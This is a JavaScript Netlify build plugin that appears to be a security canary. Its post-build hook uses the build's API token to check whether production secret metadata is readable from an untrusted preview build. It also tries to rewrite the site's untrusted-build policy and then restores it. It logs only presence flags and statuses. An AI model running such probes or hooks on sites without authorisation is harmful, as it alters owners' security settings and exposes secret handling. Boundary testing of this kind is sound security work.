const SECRET_KEY = 'UNTRUSTED_PREVIEW_GUARD_SECRET'

const normalizeApiHost = (apiHost) =>
  /^https?:\/\//i.test(apiHost || '') ? apiHost : `https://${apiHost || 'api.netlify.com'}`

const requestJson = async ({ url, token, method = 'GET', body }) => {
  try {
    const response = await fetch(url, {
      method,
      headers: {
        Authorization: `Bearer ${token}`,
        ...(body ? { 'Content-Type': 'application/json' } : {}),
      },
      body: body ? JSON.stringify(body) : undefined,
      redirect: 'error',
      signal: AbortSignal.timeout(10_000),
    })
    let parsed = null
    try {
      parsed = await response.json()
    } catch {}
    return { status: response.status, ok: response.ok, parsed }
  } catch (error) {
    return {
      status: null,
      ok: false,
      parsed: null,
      requestFailed: true,
      errorClass: error?.constructor?.name || 'Error',
    }
  }
}

const readProductionSecretMetadata = async ({ token, siteId, accountId, apiHost }) => {
  const endpoint = new URL(`/api/v1/accounts/${encodeURIComponent(accountId)}/env`, apiHost)
  endpoint.searchParams.set('site_id', siteId)
  endpoint.searchParams.set('context_name', 'production')
  endpoint.searchParams.set('scope', 'builds')

  const response = await requestJson({ url: endpoint, token })
  const target = Array.isArray(response.parsed)
    ? response.parsed.find((item) => item?.key === SECRET_KEY)
    : null
  const productionValuePresent = Array.isArray(target?.values)
    ? target.values.some(
        (item) => item?.context === 'production' && typeof item?.value === 'string' && item.value.length > 0,
      )
    : false

  return {
    status: response.status,
    requestFailed: response.requestFailed === true,
    returnedArray: Array.isArray(response.parsed),
    targetFound: Boolean(target),
    targetMarkedSecret: target?.is_secret === true,
    productionValuePresent,
  }
}

const readSitePolicy = async ({ token, siteId, apiHost }) => {
  const endpoint = new URL(`/api/v1/sites/${encodeURIComponent(siteId)}`, apiHost)
  const response = await requestJson({ url: endpoint, token })
  return {
    status: response.status,
    requestFailed: response.requestFailed === true,
    untrustedFlow:
      typeof response.parsed?.build_settings?.untrusted_flow === 'string'
        ? response.parsed.build_settings.untrusted_flow
        : null,
    publicRepo: response.parsed?.build_settings?.public_repo === true,
  }
}

const writeSitePolicy = async ({ token, siteId, apiHost, untrustedFlow }) => {
  const endpoint = new URL(`/api/v1/sites/${encodeURIComponent(siteId)}`, apiHost)
  const response = await requestJson({
    url: endpoint,
    token,
    method: 'PATCH',
    body: { build_settings: { untrusted_flow: untrustedFlow } },
  })
  return {
    status: response.status,
    accepted: response.ok,
    requestFailed: response.requestFailed === true,
    returnedFlow:
      typeof response.parsed?.build_settings?.untrusted_flow === 'string'
        ? response.parsed.build_settings.untrusted_flow
        : null,
  }
}

const runPolicyCanary = async ({ token, siteId, apiHost }) => {
  const result = {
    requestedTransition: 'redact->review->redact',
    baseline: await readSitePolicy({ token, siteId, apiHost }),
    stricterWrite: null,
    stricterReadback: null,
    restoreWrite: null,
    finalReadback: null,
  }

  if (result.baseline.untrustedFlow !== 'redact') {
    result.skipped = 'baseline-not-redact'
    return result
  }

  try {
    result.stricterWrite = await writeSitePolicy({
      token,
      siteId,
      apiHost,
      untrustedFlow: 'review',
    })
    result.stricterReadback = await readSitePolicy({ token, siteId, apiHost })
  } finally {
    result.restoreWrite = await writeSitePolicy({
      token,
      siteId,
      apiHost,
      untrustedFlow: 'redact',
    })
    result.finalReadback = await readSitePolicy({ token, siteId, apiHost })
  }

  result.stricterTransitionObserved = result.stricterReadback?.untrustedFlow === 'review'
  result.restoreObserved = result.finalReadback?.untrustedFlow === 'redact'
  return result
}

export const onPostBuild = async ({ constants }) => {
  const token = constants.NETLIFY_API_TOKEN
  const siteId = constants.SITE_ID
  const accountId = constants.ACCOUNT_ID
  const apiHost = normalizeApiHost(constants.NETLIFY_API_HOST)
  const prerequisites = {
    tokenPresent: typeof token === 'string' && token.length > 0,
    siteIdPresent: typeof siteId === 'string' && siteId.length > 0,
    accountIdPresent: typeof accountId === 'string' && accountId.length > 0,
  }
  const result = {
    phase: 'untrusted-plugin-policy-write-canary-v2',
    context: process.env.CONTEXT || null,
    reviewIdPresent: Boolean(process.env.REVIEW_ID),
    targetPresentInPreviewEnvironment: Boolean(process.env[SECRET_KEY]),
    prerequisites,
    productionSecretRead: null,
    policyCanary: null,
    rawCredentialLogged: false,
    secretMaterialPublished: false,
  }

  if (!prerequisites.tokenPresent || !prerequisites.siteIdPresent || !prerequisites.accountIdPresent) {
    console.log(`NETLIFY_UNTRUSTED_POLICY_PROBE ${JSON.stringify(result)}`)
    return
  }

  result.productionSecretRead = await readProductionSecretMetadata({
    token,
    siteId,
    accountId,
    apiHost,
  })
  result.policyCanary = await runPolicyCanary({ token, siteId, apiHost })
  console.log(`NETLIFY_UNTRUSTED_POLICY_PROBE ${JSON.stringify(result)}`)
}
